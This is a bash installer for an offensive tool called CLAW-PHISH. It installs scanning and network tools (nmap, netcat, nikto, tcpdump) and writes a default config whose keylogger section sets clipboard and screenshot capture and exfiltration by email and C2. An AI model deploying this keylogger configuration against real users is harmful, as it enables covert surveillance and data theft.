#!/bin/bash
# ============================================
# 🦀 CLAW-PHISH v5.0.0 - Linux/macOS Installer
# ============================================

set -e

# Colors
RED='\033[91m'
GREEN='\033[92m'
YELLOW='\033[93m'
BLUE='\033[94m'
PURPLE='\033[95m'
CYAN='\033[96m'
WHITE='\033[97m'
RESET='\033[0m'
BOLD='\033[1m'

echo -e "${PURPLE}${BOLD}"
echo "╔══════════════════════════════════════════════════════════════════════════════╗"
echo "║        🦀 CLAW-PHISH v5.0.0 - INSTALLER                                 ║"
echo "╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"

# Check Python version
echo -e "${BLUE}🔍 Checking Python version...${RESET}"
python_version=$(python3 --version 2>&1 | cut -d' ' -f2)
required_version="3.8.0"

if [[ $(echo "$python_version" | cut -d. -f1,2 | sed 's/\.//') -lt $(echo "$required_version" | cut -d. -f1,2 | sed 's/\.//') ]]; then
    echo -e "${RED}❌ Python $required_version+ required (found $python_version)${RESET}"
    exit 1
fi
echo -e "${GREEN}✅ Python $python_version found${RESET}"

# Detect OS
echo -e "${BLUE}🔍 Detecting OS...${RESET}"
OS=$(uname -s)
if [[ "$OS" == "Linux" ]]; then
    echo -e "${GREEN}✅ Linux detected${RESET}"
    # Check package manager
    if command -v apt &> /dev/null; then
        PKG_MGR="apt"
        echo -e "${GREEN}✅ APT package manager detected${RESET}"
    elif command -v apk &> /dev/null; then
        PKG_MGR="apk"
        echo -e "${GREEN}✅ APK package manager detected (Alpine)${RESET}"
    elif command -v yum &> /dev/null; then
        PKG_MGR="yum"
        echo -e "${GREEN}✅ YUM package manager detected${RESET}"
    elif command -v dnf &> /dev/null; then
        PKG_MGR="dnf"
        echo -e "${GREEN}✅ DNF package manager detected${RESET}"
    else
        echo -e "${YELLOW}⚠️ Unknown package manager${RESET}"
        PKG_MGR="manual"
    fi
elif [[ "$OS" == "Darwin" ]]; then
    echo -e "${GREEN}✅ macOS detected${RESET}"
    PKG_MGR="brew"
else
    echo -e "${YELLOW}⚠️ Unknown OS: $OS${RESET}"
    PKG_MGR="manual"
fi

# Install system dependencies
echo -e "${BLUE}📦 Installing system dependencies...${RESET}"

case $PKG_MGR in
    apt)
        sudo apt update
        sudo apt install -y \
            python3-pip python3-dev \
            nmap curl netcat-openbsd openssh-client \
            whois dnsutils iptables tcpdump traceroute \
            nikto git build-essential \
            libffi-dev libssl-dev cargo
        ;;
    apk)
        sudo apk add --no-cache \
            python3 py3-pip py3-dev \
            nmap curl netcat-openbsd openssh-client \
            whois bind-tools iptables tcpdump traceroute \
            nikto git build-base \
            libffi-dev openssl-dev cargo
        ;;
    brew)
        brew install python3 nmap curl netcat openssh whois bind iptables tcpdump traceroute nikto git
        ;;
    *)
        echo -e "${YELLOW}⚠️ Please install dependencies manually:${RESET}"
        echo "  - python3, pip3, nmap, curl, netcat, openssh-client"
        echo "  - whois, dnsutils, iptables, tcpdump, traceroute, nikto"
        ;;
esac

# Create virtual environment
echo -e "${BLUE}🐍 Creating virtual environment...${RESET}"
python3 -m venv claw_env
source claw_env/bin/activate

# Upgrade pip
echo -e "${BLUE}⬆️ Upgrading pip...${RESET}"
pip install --upgrade pip setuptools wheel

# Install Python dependencies
echo -e "${BLUE}📦 Installing Python dependencies...${RESET}"
pip install -r requirements.txt

# Create directories
echo -e "${BLUE}📁 Creating directories...${RESET}"
mkdir -p .claw_phish reports temp

# Create config
echo -e "${BLUE}⚙️ Creating default configuration...${RESET}"
cat > .claw_phish/config.json << 'EOF'
{
    "version": "5.0.0",
    "auto_start": false,
    "auto_block_enabled": false,
    "auto_block_threshold": 5,
    "scan_timeout": 30,
    "report_format": "html",
    "generate_graphics": true,
    "web": {
        "enabled": false,
        "port": 5000,
        "host": "0.0.0.0",
        "secret_key": "",
        "require_auth": true
    },
    "keylogger": {
        "enabled": false,
        "hotkey": "f10",
        "log_file": ".claw_phish/keylog.txt",
        "upload_interval": 30,
        "screenshot_interval": 60,
        "capture_clipboard": true,
        "exfil_methods": ["file", "email", "c2"]
    },
    "monitoring": {
        "enabled": true,
        "port_scan_threshold": 10,
        "syn_flood_threshold": 100,
        "http_flood_threshold": 200
    }
}
EOF

# Create run script
echo -e "${BLUE}🚀 Creating run script...${RESET}"
cat > run_claw.sh << 'EOF'
#!/bin/bash
source claw_env/bin/activate
python3 claw_phish.py "$@"
EOF
chmod +x run_claw.sh

# Final message
echo -e "${GREEN}${BOLD}"
echo "╔══════════════════════════════════════════════════════════════════════════════╗"
echo "║                    🦀 CLAW-PHISH INSTALLATION COMPLETE!                   ║"
echo "╚══════════════════════════════════════════════════════════════════════════════╝"
echo -e "${RESET}"
echo -e "${GREEN}✅ Installation successful!${RESET}"
echo ""
echo -e "${CYAN}🚀 To run:${RESET}"
echo -e "  ${WHITE}./run_claw.sh${RESET}"
echo ""
echo -e "${CYAN}📁 Files:${RESET}"
echo -e "  ${WHITE}• Main script: claw_phish.py${RESET}"
echo -e "  ${WHITE}• Virtual env: claw_env/${RESET}"
echo -e "  ${WHITE}• Config: .claw_phish/config.json${RESET}"
echo -e "  ${WHITE}• Logs: .claw_phish/claw_phish.log${RESET}"
echo ""
echo -e "${YELLOW}⚠️  For authorized security testing only${RESET}"